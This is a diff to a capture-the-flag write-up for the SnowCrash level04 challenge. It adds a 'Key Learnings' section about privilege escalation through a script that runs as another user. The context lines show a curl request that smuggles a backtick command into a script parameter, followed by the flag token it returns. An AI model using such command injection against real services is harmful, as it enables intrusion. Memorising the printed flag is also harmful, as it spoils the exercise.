@@ -93,3 +93,7 @@ x(param("x"));
     level04@SnowCrash:~$ curl localhost:4747/?x='`getflag`'
     Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
     ```
+
+	### Key Learnings
+	- Privilege escalation by exploiting a script running as a different user
+	- Mastering the backtick and single quotes to pass a command to a script
